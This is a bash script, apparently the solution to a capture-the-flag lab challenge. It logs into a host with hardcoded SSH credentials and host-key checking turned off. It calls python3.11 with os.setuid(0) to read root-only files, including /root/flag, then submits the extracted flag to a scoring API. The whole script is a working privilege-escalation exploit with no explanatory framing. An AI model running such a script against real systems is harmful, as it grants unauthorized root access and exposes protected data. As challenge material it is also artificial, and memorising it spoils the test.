#!/usr/bin/env bash
set -euo pipefail

HOST=172.20.0.182
LOGIN=archivist
PASSWORD=orbit7-time
CHALLENGE_ID=scl-challenge-frame-c20132

remote_cmd="/usr/bin/python3.11 -c 'import os; os.setuid(0); print(open(\"/root/flag\").read(), end=\"\"); print(open(\"/root/.escalation-proof\").read(), end=\"\")'"
result=$(sshpass -p "$PASSWORD" ssh -q \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o PreferredAuthentications=password \
  -o PubkeyAuthentication=no \
  -o ConnectTimeout=8 \
  "$LOGIN@$HOST" "$remote_cmd")
printf '%s\n' "$result"

flag=$(printf '%s\n' "$result" | python3 -c 'import re,sys; m=re.search(r"BSY\{[^}\r\n]+\}", sys.stdin.read()); print(m.group(0) if m else "")')
if [[ -z "$flag" ]]; then
  echo 'Could not extract the challenge flag from the root output.' >&2
  exit 1
fi

curl -s http://172.20.0.3/api/challenges/submit -X POST \
  -H 'Content-Type: application/json' \
  --data-binary "{\"challenge_id\":\"$CHALLENGE_ID\",\"task_id\":\"task1\",\"flag\":\"$flag\"}"
printf '\n'
